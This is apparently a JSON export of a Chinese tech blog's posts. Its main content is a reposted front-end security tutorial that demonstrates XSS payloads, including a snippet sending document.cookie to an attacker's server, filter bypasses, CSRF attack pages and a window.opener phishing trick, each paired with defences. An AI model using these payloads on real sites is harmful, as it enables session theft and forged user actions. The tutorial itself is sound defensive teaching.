所采纳 参考资料：http://stackoverflow.com/questions/2550431/what-is-the-difference-between-progressive-enhancement-and-graceful-degradation http://www.candoudou.com/archives/481","comments":true,"tags":[{"name":"css","slug":"css","permalink":"http://www.wanyifeng.top/tags/css/"},{"name":"杂文","slug":"杂文","permalink":"http://www.wanyifeng.top/tags/杂文/"}]},{"title":"函数节流","date":"2017-02-07T07:18:11.000Z","path":"2017/02/07/函数节流/","text":"​ JavaScript 中的函数大多数情况下都是由用户主动调用触发的，除非是函数本身的实现不合理，否则我们一般不会遇到跟性能相关的问题。但在一些少数情况下，函数的触发不是由用户直接控制的。在这些场景下，函数有可能被非常频繁地调用，而造成大的性能问题。 函数被频繁调用的场景 window.onresize 事件。我们给window 对象绑定了resize 事件，当浏览器窗口大小被拖动而改变的时候，这个事件触发的频率非常之高。如果我们在window.onresize 事件函数里有一些跟DOM 节点相关的操作，而跟DOM节点相关的操作往往是非常消耗性能的，这时候浏览器可能就会吃不消而造成卡顿现象。 mousemove 事件。同样，如果我们给一个div 节点绑定了拖曳事件（主要是mousemove），当 div 节点被拖动的时候，也会频繁地触发该拖曳事件函数。 上传进度。微云的上传功能使用了公司提供的一个浏览器插件。该浏览器插件在真正开始上传文件之前，会对文件进行扫描并随时通知JavaScript 函数，以便在页面中显示当前的扫描进度。但该插件通知的频率非常之高，大约一秒钟10 次，很显然我们在页面中不需要如此频繁地去提示用户。 键盘事件参考百度的搜索框没输入一个字母就发送一次Ajax请求开销很大 通过下面的函数可以实现性能的优化,每过500ms 触发一次事件 123456789101112 var isClick; $( 'text' ).on( 'keydown', function () &#123; clearTimeout( isClick ); isClick = setTimeout(function () &#123; //发送Ajax请求 $.ajax(&#123; url: '...' ... &#125;); &#125;, 500 ); &#125;);//上面所有的使用场景都适用 鼠标移动触发事件 12345678910111213141516var range = 10*10;//定义返回10px 小面 三角函数未开方 所有这里需要*10var currentPoint;function distance( p1, p2 ) &#123; return Math.abs( Math.pow (p1.x - p2.x, 2 ) - Math.pow (p1.y - p2.y, 2 ) );&#125;$( '#div' ).on( 'mousemove', function ( e ) &#123; if ( !currentPoint ) &#123; currentPoint = &#123; x:e.offsetX, y:e.offsetY &#125;; &#125;;if ( distance( currentPoint, e.PONIT ) &lt; range ) return; // 正常执行的代码 currentPoint = &#123;&#125;;&#125;); 总结 : 函数节流就是为了解决函数的触发频率过高的问题","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"vue技术栈与常用基于Vue的ui框架","date":"2017-01-18T02:13:21.000Z","path":"2017/01/18/vue技术栈与基于Vue的ui框架/","text":"技术栈: vue + webpack + vue-router + vue-resource + vuex。​ 每个组件也是一个 .vue 文件，如果遇到比较复杂的、父子组件间需要频繁通信的场景，可以用 vuex 搞定。 开源在 github （饿了么前端 · GitHub）上，可以去试一试。 vue-swipe：https://github.com/ElemeFE/vue-swipe 幻灯片组件vue-infinite-scroll：https://github.com/ElemeFE/vue-infinite-scroll 无限滚动，可以实现向下的无限加载。是一个 directivevue-loadmore：https://github.com/ElemeFE/vueloadmore 下拉加载和上拉加载。是一个 componentvue-toast-mobile：https://github.com/ElemeFE/vue-toast-mobile toast 组件vue-indicator：https://github.com/ElemeFE/vue-indicator indicator 组件，提示用户正在加载，自带 modalvue-msgbox：https://github.com/ElemeFE/vue-msgbox.弹出框组件 Element 组件饿了么前端推出的基于 Vue.js 2.0 的后台组件库，它能够帮助你更轻松更快速地开发 web 项目 Element:[http://element.eleme.io/#/zh-CN/component/layout] Iview一套基于 Vue.js 的高质量 UI 组件库 Iview:[https://www.iviewui.com/components/slider] Mint-ui 基于 vue.js 的移动端 UI 框架 Mint-ui [http://mint-ui.github.io/#!/en] mui : [http://dev.dcloud.net.cn/mui/]","comments":true,"tags":[{"name":"Vue","slug":"Vue","permalink":"http://www.wanyifeng.top/tags/Vue/"}]},{"title":"前端攻击都有哪些形式，我该如何防范？","date":"2017-01-12T09:33:21.000Z","path":"2017/01/12/前端攻击都有哪些形式，我该如何防范？/","text":"随着互联网的发达，各种WEB应用也变得越来越复杂，满足了用户的各种需求，但是随之而来的就是各种网络安全的问题。作为前端工程师的我们也逃不开这个问题。所以今天，就和大家一起聊一聊WEB前端的安全那些事儿。这里不去说那些后端的攻击(SQL注入、DDOS攻击等)，毕竟整个WEB安全是一门很深的学问，不是我一篇文章就能完全说完的。我们就聊一聊前端工程师们需要注意的那些安全知识。 其实真正为了玩的心态去进行黑网站的人，还是少数。多数攻击还是有利益的成分在里面的。我模糊的记得，以前听腾讯的工程师说过一句话，大概是这样的：开发者不可能确保自己的应用绝对无法被攻击，但是只要攻击我们的时候，黑客花费的成本远比他可以获取的利益大得多，黑客就不会去攻击。防范强如支付宝、QQ等产品，也都曾被报过漏洞，看来防御不是绝对的，我们只能想办法让我们的应用更加安全。 前端攻击都有哪些形式，我该如何防范？1 XSS攻击1.1 是什么？百度百科中如是说道：XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。其实在web前端方面，可以简单的理解为一种JavaScript代码注入。举个例子，我们有个社交网站，允许大家相互访问空间，网站可能是这样做的： 1234567891011121314151617181920212223&lt;?php $username=\"侯医生\";?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo $username;?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 运行时，展现形式如图1.1.1所示： 图1.1.1 但是，如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。代码如下，效果如图1.1.2 123&lt;?php $username=\"&lt;script&gt;alert('侯医生');&lt;/script&gt;\";?&gt; 图1.1.2如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码： 12345$.ajax(&#123; url: '自己的服务器', dataType: 'jsonp', data: &#123;'盗取的用户cookie': document.cookie&#125;&#125;); 再在各个QQ群中，散播自己的空间，引诱别人来访问。就可以拿到用户在这个域名下的cookie或者其他隐私了。 1.2 如何防范？目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示，代码如下，效果如图1.2.1 123456789101112131415161718192021222324&lt;?php $username=\"&lt;script&gt;alert('侯医生');&lt;/script&gt;\";?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;/head&gt; &lt;body&gt; &lt;!--我们将输出的后端变量，转义之后再输出，则可以避免被注入代码--&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 图1.2.1其实，我们再来看看网页源码，如图1.2.2图1.2.2虽然显示出来是有script标签的，但是实际上，script标签的左右尖括号(&gt;&lt;)，均被转义为html字符实体，所以，便不会被当做标签来解析的，但是实际显示的时候，这两个尖括号，还是可以正常展示的。 1.3 升级攻击1.3.1 append的利用上一小节我们防住了script标签的左右尖括号，蓝鹅，聪明的黑客们还是想出了好办法去破解，我们知道，直接给innerHTML赋值一段js，是无法被执行的。比如， 1$('div').innerHTML = '&lt;script&gt;alert(\"okok\");&lt;/script&gt;'; 但是，jQuery的append可以做到，究其原因，就是因为jquery会在将append元素变为fragment的时候，找到其中的script标签，再使用eval执行一遍。jquery的append使用的方式也是innerHTML(如图1.3.1.1)。而innerHTML是会将unicode码转换为字符实体的。图1.3.1.1利用这两种知识结合，我们可以得出，网站使用append进行dom操作，如果是append我们可以决定的字段，那么我们可以将左右尖括号，使用unicode码伪装起来，就像这样–&quot;\\u003cscript\\u003ealert(&#39;okok&#39;);&quot;。接下来转义的时候，伪装成\\u003的&lt;会被漏掉，append的时候，则会被重新调用。代码如下，效果如图1.3.1.2 12345678910111213141516171819202122232425262728&lt;?php $username=\"\\u003cscript\\u003ealert('okok');\";?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;script src=\"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;div&gt;版权所有：&lt;span id=\"username_info\"&gt;&lt;/span&gt;&lt;/div&gt; &lt;script&gt; $('#username_info').append(\"&lt;?php echo htmlentities($username);?&gt;\"); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 图1.3.1.2我们可以看到，虽然进行了转义，注入的代码还是会再次被执行。 1.3.2 img标签的再次利用再来一种攻击方式，img标签的小贴士。这里我们需要重温一个小知识点—–img标签，在加载图片失败的时候，会调用该元素上的onerror事件。我们正可以利用这种方式来进行攻击。我们先来看一下，正常的用户分享图片的行为怎么做。代码如下，展示如图1.3.2.1 12345678910111213141516171819202122232425&lt;?php $username=\"&lt;script&gt;alert('侯医生');&lt;/script&gt;\"; $imgsrc=\"http://img5.imgtn.bdimg.com/it/u=1412369044,967882675&amp;fm=11&amp;gp=0.jpg\";?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1，这个是图片： &lt;img src=\"&lt;?php echo $imgsrc;?&gt;\" /&gt; &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 图1.3.2.1但是，如果这张图片的地址我们换种写法呢？ 123&lt;?php $imgsrc=\"\\\" onerror=\\\"javascript:alert('侯医生');\\\"\";?&gt; 我们再来看看拼装好的html源码，如图1.3.2.2：图1.3.2.2这时的源码已经变为–src为空，但是onerror的时候，执行注入代码。我们刷新查看页面，就会发现，代码注入已经成功，如图1.3.2.3所示：图1.3.2.3看官你可能会说了，再转义呗。是的，老套路，我们接着进行转义—你这个毛病呀，就算治好了(老中医口吻)。 1&lt;img src=&quot;&lt;?php echo htmlentities($imgsrc);?&gt;&quot; /&gt; 恩，总算是恢复正常了，如图1.3.2.4所示。图1.3.2.4 1.3.3 组合使用但是……但是，道高一尺魔高一丈，虽然防住了img标签直接的输出，但是我们的攻击点又来了，我们将1.3.1中所说的方式与1.3.2中所说的方式进行结合，进行一种组合式攻击，我们之前说过，innerHTML赋值的script标签，不会被执行，但是innerHTML赋值一个img标签是可以被识别的。我们把img标签的左右尖括号，使用unicode进行伪装，让转义方法认不出来，即使innerHTML也可以利用上了，代码如下，效果如图1.3.3.1 123456789101112131415161718192021222324252627&lt;?php $username=\"\\u003cimg src=\\'\\' onerror=javascript:alert(\\'okok\\');\\u003e\";?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;div&gt;版权所有：&lt;span id=\"username_info\"&gt;&lt;/span&gt;&lt;/div&gt; &lt;script&gt; document.getElementById('username_info').innerHTML = \"&lt;?php echo htmlentities($username);?&gt;\"; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 图1.3.3.1这样，innerHTML也可以派上用场，再次突破防线。 1.4 升级防御看来，我们需要再次进行防御升级了，我们将输出的字符串中的\\反斜杠进行转义(json转义)。这样，\\就不会被当做unicode码的开头来被处理了。代码如下： 1document.getElementById('username_info').innerHTML = &lt;?php echo json_encode(htmlentities($username));?&gt;; 生成处的源码，如图1.4.1图1.4.1效果如图1.4.2所示图1.4.2 1.5 XSS再升级都说了道高一尺魔高一丈了，你以为防得住后端输出，黑客大大们就没办法攻击了吗。我们有的时候，会有一些习惯，拿URL上的get参数去构建网页。好比说，直接拿url上的用户名去展示啦，拿url上的一些回跳地址之类的。但是url上的参数，我们是无法提前对其进行转义的。接下来，来个例子，代码如下： 1234567891011121314151617181920212223242526&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;script src=\"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 用户名：&lt;?php echo htmlentities($username);?&gt; &lt;/div&gt; &lt;div&gt; 第一条状态：侯医生的状态1 &lt;/div&gt; &lt;div&gt; 第二条状态：侯医生的状态2 &lt;/div&gt; &lt;div&gt; 第三条状态：侯医生的状态3 &lt;/div&gt; &lt;div&gt;版权所有：&lt;span id=\"username_info\"&gt;&lt;/span&gt;&lt;/div&gt; &lt;script&gt; var param = /=(.+)$/.exec(location.search); var value = decodeURIComponent(param[1]); $('#username_info').append(value); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 上述代码，满足了一个很正常的需求，解开URL中的一个参数，并将其渲染至页面上。但是，这里面存在一个风险，如果黑客在URL的这个参数中，加入js代码，这样便又会被执行(如图1.5.1所示)。图1.5.1 1.6 防御再次升级像这种从url中获取的信息，笔者建议，最好由后端获取，在前端转义后再行输出，代码如下，效果如图1.6.1 1234&lt;script&gt; var value = decodeURIComponent(\"&lt;?php echo htmlentities($_GET['username']);?&gt;\"); $('#username_info').append(value);&lt;/script&gt; 图1.6.1使用url中的参数的时候要小心，更不要拿URL中的参数去eval。 1.7 保护好你的cookie如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的。PHP的设置方法如下： 123&lt;?php setcookie(\"userpass\", \"doctorhou-shuai\", NULL, NULL, NULL, NULL, TRUE);?&gt; 如图1.7.1，我们的cookie已经种上了，并且有了httpOnly标识图1.7.1如图1.7.2，我们通过js无法获取cookie中的设定有httpOnly的字段：图1.7.2话说回来，其实还有很多xss的升级攻击方式，同学们有兴趣的话，可以自己去研究一下。(不要干坏事儿哦) 2 CSRF攻击2.1 什么是CSRF攻击？CSRF攻击在百度百科中的解释是：CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上(如：你所使用的网络银行的网站)。 2.2 如何攻击？2.2.1 要合理使用post与get通常我们会为了省事儿，把一些应当提交的数据，做成get请求。殊不知，这不仅仅是违反了http的标准而已，也同样会被黑客所利用。比如，你开发的网站中，有一个购买商品的操作。你是这么开发的： 1234567891011&lt;?php// 从cookie中获取用户名，看似稳妥$username = $_COOKIE['username'];$productId = $_GET['pid'];// 这里进行购买操作//store_into_database($username, $productId);?&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;?phpecho $username . '买入商品：' . $productId;?&gt; 而商品ID图个省事儿，就使用了url中的get参数。买商品的话，如图2.2.1.1所示图2.2.1.1那么，黑客的网站可以这样开发： 123456789&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=\"http://localhost:8082/lab/xsrflab/submit.php?pid=1\" /&gt; &lt;/body&gt;&lt;/html&gt; 这样的话，用户只需要访问一次黑客的网站，其实就相当于在你的网站中，操作了一次。然而用户却没有感知。如图2.2.1.2所示：图2.2.1.2所以，我们日常的开发，还是要遵循提交业务，严格按照post请求去做的。更不要使用jsonp去做提交型的接口，这样非常的危险。 2.2.2 xsrf攻击升级如果你使用了post请求来处理关键业务的，还是有办法可以破解的。我们的业务代码如下： 1234567891011&lt;?php$username = $_COOKIE['username'];// 换为post了，可以规避黑客直接的提交$productId = $_POST['pid'];// 这里进行购买操作//store_into_database($username, $productId);?&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;?phpecho $username . '买入商品：' . $productId;?&gt; 黑客代码如下： 1234567891011121314151617181920&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;script src=\"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;button id=\"clickme\"&gt;点我看相册&lt;/button&gt; &lt;script&gt; $('#clickme').on('click', function () &#123; // 用户再不知情的情况下，提交了表单，服务器这边也会以为是用户提交过来的。 $('#myform').submit(); &#125;); &lt;/script&gt; &lt;form id=\"myform\" style=\"display:none;\" target=\"myformer\" method=\"post\" action=\"http://myhost:8082/lab/xsrflab/submit.php\"&gt; &lt;input type=\"hidden\" name=\"pid\" value=\"1\"&gt; &lt;/form&gt; &lt;iframe name=\"myformer\" style=\"display:none;\"&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 效果如图2.2.2.1图2.2.2.1点击后，用户进行了提交，却连自己都不知情。这种情况如何防御呢？最简单的办法就是加验证码，这样除了用户，黑客的网站是获取不到用户本次session的验证码的。但是这样也会降低用户的提交体验，特别是有些经常性的操作，如果总让用户输入验证码，用户也会非常的烦。另一种方式，就是在用访问的页面中，都种下验证用的token，用户所有的提交都必须带上本次页面中生成的token，这种方式的本质和使用验证码没什么两样，但是这种方式，整个页面每一次的session，使用同一个token就行，很多post操作，开发者就可以自动带上当前页面的token。如果token校验不通过，则证明此次提交并非从本站发送来，则终止提交过程。如果token确实为本网站生成的话，则可以通过。代码如下，防御效果如图2.2.2.2 12345678910111213141516171819202122&lt;?php$username = $_COOKIE['username'];$productId = $_POST['pid'];$token=$_POST['token'];// 校验算法例子function check_token($token) &#123; if ($token==='doctorhou-shuai') &#123; return true; &#125; return false;&#125;if (!check_token($token)) &#123; // 如果校验未通过，则中止 return ;&#125;// 这里进行购买操作//store_into_database($username, $productId);?&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;?phpecho $username . '买入商品：' . $productId;?&gt; 图2.2.2.2如上图，并没有携带本站每次session生成的token，则提交失败。本站的网站form，则都会自动携带本站生成的token 12345678910111213141516171819&lt;?php function token_creater() &#123; // 本站生成token的方法 return 'doctorhou-shuai';&#125;?&gt;&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;script src=\"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form id=\"myform\" target=\"myformer\" method=\"post\" action=\"http://localhost:8082/lab/xsrflab/submit.php\"&gt; 商品名称：&lt;input name=\"pid\" value=\"1\"&gt; &lt;input type=\"hidden\" name=\"token\" value=\"&lt;?php echo token_creater();?&gt;\" /&gt; &lt;input type=\"submit\" value=\"提交\" /&gt; &lt;/form&gt; &lt;iframe name=\"myformer\" style=\"display:none;\"&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 再次使用本站的网页进行提交，则通过，如图2.2.2.3所示：图2.2.2.3当然，上面的只是例子，具体的token生成，肯定是要随着session与用户ID去变的，如果各位看官觉得自己的网站也需要加个token，请自行百度，进行深入的学习。 3 网络劫持攻击很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以结果该用户收发的所有数据。这里，建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。 如果你的网站还没有进行https加密的化，则在表单提交部分，最好进行非对称加密–即客户端加密，只有服务端能解开。这样中间的劫持者便无法获取加密内容的真实信息了。 4 控制台注入代码不知道各位看官有没有注意到天猫官网控制台的警告信息，如图4.1所示，这是为什么呢？因为有的黑客会诱骗用户去往控制台里面粘贴东西（欺负小白用户不懂代码），比如可以在朋友圈贴个什么文章，说:”只要访问天猫，按下F12并且粘贴以下内容，则可以获得xx元礼品”之类的，那么有的用户真的会去操作，并且自己隐私被暴露了也不知道。图4.1天猫这种做法，也是在警告用户不要这么做，看来天猫的前端安全做的也是很到位的。不过，这种攻击毕竟是少数，所以各位看官看一眼就行，如果真的发现有的用户会被这样攻击的话，记得想起天猫的这种解决方案。 5 钓鱼钓鱼也是一种非常古老的攻击方式了，其实并不太算前端攻击。可毕竟是页面级别的攻击，我们也来一起聊一聊。我相信很多人会有这样的经历，QQ群里面有人发什么兼职啦、什么自己要去国外了房子车子甩卖了，详情在我QQ空间里啦，之类的连接。打开之后发现一个QQ登录框，其实一看域名就知道不是QQ，不过做得非常像QQ登录，不明就里的用户们，就真的把用户名和密码输入了进去，结果没登录到QQ，用户名和密码却给人发过去了。其实这种方式，在前端也有利用。下面，我们就来试试如果利用前端进行一次逼真的钓鱼。1 首先，我们在xx空间里分享一篇文章，然后吸引别人去点击。效果如图5.1.1 1234567891011121314151617&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; 当前你在xx空间 &lt;/div&gt; &lt;h1&gt;侯博士的分享&lt;/h1&gt; &lt;section&gt; 咱们班当年班花，现在长这样： &lt;!--这是咱们的钓鱼网站--&gt; &lt;a href=\"http://localhost:8082/lab/fish/cheat.php\" target=\"_blank\"&gt;点我查看&lt;/a&gt; &lt;/section&gt; &lt;/body&gt;&lt;/html&gt; 图5.1.12 接着，我们在cheat.php这个网站上面，将跳转过来的源网页地址悄悄的进行修改。效果如图5.2.1 12345678910111213141516&lt;!DOCYTPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;script src=\"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; 你想看的信息： xxxxxxxxxxxxxx xxxxxxxxxxxxxx &lt;script&gt; // 在用户不知情的情况下，对跳转的来源网页进行地址替换 window.opener.location = 'http://localhost:8082/lab/fish/myfishsite.php'; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 于是，在用户访问了我们的欺骗网站后，之前的tab已经悄然发生了变化，我们将其悄悄的替换为了钓鱼的网站，欺骗用户输入用户名、密码等。图5.2.13 我们的钓鱼网站，伪装成XX空间，让用户输入用户名与密码，如图5.3.1图5.3.1这种钓鱼方式比较有意思，重点在于我们比较难防住这种攻击，我们并不能将所有的页面链接都使用js打开。所以，要么就将外链跳转的连接改为当前页面跳转，要么就在页面unload的时候给用户加以提示，要么就将页面所有的跳转均改为window.open，在打开时，跟大多数钓鱼防治殊途同归的一点是，我们需要网民们的安全意识提高。 我们平时开发要注意些什么？ 开发时要提防用户产生的内容，要对用户输入的信息进行层层检测 要注意对用户的输出内容进行过滤(进行转义等) 重要的内容记得要加密传输(无论是利用https也好，自己加密也好) get请求与post请求，要严格遵守规范，不要混用，不要将一些危险的提交使用jsonp完成。 对于URL上携带的信息，要谨慎使用。 心中时刻记着，自己的网站哪里可能有危险。 毕竟web安全是个很大的面，如果需要了解，还是需要进行专门的学习的。希望这篇聊一聊，可以让各位开发者的网站变得更安全。 转载自：https://segmentfault.com/a/1190000006672214?utm_source=weekly&amp;utm_medium=email&amp;utm_campaign=email_weekly#articleHeader14 欢迎大家收看聊一聊系列，这一套系列文章，可以帮助前端工程师们了解前端的方方面面（不仅仅是代码）：https://segmentfault.com/blog…","comments":true,"tags":[{"name":"杂文","slug":"杂文","permalink":"http://www.wanyifeng.top/tags/杂文/"}]},{"title":"jsonp 处理跨域简单实现","date":"2017-01-12T03:13:21.000Z","path":"2017/01/12/JSONP原理/","text":"什么是跨域？ jsonp 处理跨域 jsonp 核心是 script 标签 img、link、script 等标签没有跨域限制 交互模型： 利用 script 标签发请求 在客户端定义全局函数接收请求的结果数据 由服务器对发送的数据做包装处理 客户端收到响应的数据解析（调用提前定义好的函数） 客户端实现代码 1234567891011121314151617181920212223242526272829303132function jsonp(options) &#123; // 1. 创建 script 标签 // 2. 为 script 标签指定请求路径 // 3. 上 DOM，由浏览器去帮你解析处理发请求 // 4. 请求响应成功，执行 options 中的 success 指定的回调处理函数 var script = document.createElement('script') var callbackName = 'my_' + Math.random().toString().substr(2) // 这里将参数选项中的 success 挂载给全局的 window 对象 // 当服务端响应回来的数据解析执行的时候，就要调用这个全局函数 window.callback // 调用 window.callback 其实就相当于调用了 options.success // 服务端响应了一个类似于这样的代码：my_1561561(数据) window[callbackName] = function (data) &#123; options.success(data) document.body.removeChild(script) // 删除生成的 script 标签 delete window[callbackName] // 删除全局的回调处理函数 &#125; script.src = options.url + '?callback=' + callbackName // 这里只是把 script 标签上到了 DOM 中，并不是即时的发请求或者调用 success 回调处理函数 document.body.appendChild(script)&#125;jsonp(&#123; url: 'http://api.douban.com/v2/movie/in_theaters', success: function (data) &#123; console.log(data) &#125;&#125;) 服务端: 服务器端要做什么工作呢？服务器要接受参数jsoncallback，然后把jsoncallback的值作为JSON数据方法名称返回，NODEJS实现 123456789// 3. 监听客户端请求事件，设置回调处理函数// request 可以用来获取客户端的一些请求数据// response 可以用来给客户端发送响应数据server.on('request', function (request, response) &#123; var queryObj = url.parse(request.url, true).query // 在所有 write 之后，记得加上 end 结束响应 // response.end('var foo = ' + JSON.stringify(movie_list)) response.end(queryObj.callback + '(' + JSON.stringify(movie_list) + ')')&#125;) 总结: 首先在客户端注册一个callback, 然后把callback的名字传给服务器。 此时，服务器先生成 json 数据。 然后以 javascript 语法的方式，生成一个function , function 名字就是传递上来的参数 jsonp.最后将 json 数据直接以入参的方式，放置到 function 中，这样就生成了一段 js 语法的文档，返回给客户端。 客户端浏览器，解析script标签，并执行返回的 javascript 文档，此时数据作为参数，传入到了客户端预先定义好的 callback 函数里.(window.options.success)","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"jsonp","slug":"jsonp","permalink":"http://www.wanyifeng.top/tags/jsonp/"}]},{"title":"Vue组件化开发","date":"2017-01-08T12:13:21.000Z","path":"2017/01/08/Vue组件化开发/","text":"组件其实就是一个拥有样式、动画、js逻辑、HTML结构的综合块。前端组件化确实让大的前端团队更高效的开发前端项目。而作为前端比较流行的框架之一，Vue的组件和也做的非常彻底，而且有自己的特色。尤其是她单文件组件开发的方式更是非常方便，而且第三方工具支持也非常丰富，社区也非常活跃，第三方组件也呈井喷之势 全局扩展方法Vue.extendVue提供了一个全局的API，Vue.extend可以帮助我们对Vue实例进行扩展，扩展完了之后，就可以用此扩展对象创建新的Vue实例了。类似于继承的方式。 12345语法：Vue.extend( options )参数：&#123;Object&#125; options用法：使用基础 Vue 构造器，创建一个“子类”。参数是一个包含组件选项的对象 下面是一个官网demo：123456789101112131415161718192021222324&lt;div id=\"mount-point\"&gt;&lt;/div&gt;&lt;script&gt;// 创建构造器var Profile = Vue.extend(&#123; // 新的对象的模板，所有子实例都会拥有此模板 template: '&lt;p&gt;&#123;&#123;firstName&#125;&#125; &#123;&#123;lastName&#125;&#125; aka &#123;&#123;alias&#125;&#125;&lt;/p&gt;', data: function () &#123; // 创建的Vue实例时，data可以是Object 也可以是Function，但是在扩展 return &#123; // 的时候，data必须是一个函数，而且要返回值奥。 firstName: 'Walter', lastName: 'White', alias: 'Heisenberg' &#125; &#125;&#125;)&lt;/script&gt;// 创建 Profile 实例，并挂载到一个元素上。new Profile().$mount('#mount-point')// .$mount() 方法跟设置 el属性效果是一致的。结果如下：&lt;p&gt;Walter White aka Heisenberg&lt;/p&gt; 当然除了官方提供的方法外你还可以使用Vue对象的prototype直接实现扩展 12345678910111213141516import http from \"../public/tools/http.js\"Vue.prototype.getDataGet = function(url, callback) &#123; this.$http.get(http.host + url).then(res =&gt; &#123; console.log(http.host + url) callback(res.body) &#125;, err =&gt; &#123; console.log(err) &#125;)&#125;Vue.prototype.getDataPsst = function(url, data, 